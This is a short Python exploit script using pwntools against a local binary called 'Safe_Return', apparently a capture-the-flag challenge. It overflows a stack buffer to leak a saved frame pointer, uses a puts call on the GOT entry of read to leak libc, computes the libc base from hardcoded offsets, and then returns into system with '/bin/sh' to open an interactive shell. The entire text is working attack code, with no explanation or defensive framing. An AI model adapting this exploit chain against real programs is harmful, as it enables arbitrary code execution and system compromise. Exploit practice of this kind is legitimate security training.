from pwn import *

p = process("./Safe_Return")
write_addr = 0x08049291
puts_addr = 0x08049245
hello_addr = 0x0804a008
got_read = 0x0804c004
p.send(b"A"*0x34)
p.recvuntil(b"AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA")
p.recv(4)
ebp_bytes = p.recv(4)
ebp = u32(ebp_bytes)
print(hex(ebp))
safe_function = 0x080491b6
ret_nop=0x080491e4
p.recvuntil(b"\n")
payload = b"A"*0x48+p32(ebp)+p32(puts_addr)+p32(got_read)+p32(0)*2+p32(safe_function)
payload += b"A"*(0x80-len(payload))

p.send(payload)
read_leak = u32(p.clean(timeout=1)[:4])
read_offset = 0x0011e0a0
print(hex(read_leak))
libc_base = read_leak-read_offset
print(hex(libc_base))

system = libc_base + 0x0004f600
payload = b"A"*0x48+p32(ebp)+p32(system)+p32(0)+p32(ebp+20)+b"/bin/sh\x00"
payload += b"A"*(0x80-len(payload))
p.send(payload)

p.interactive()
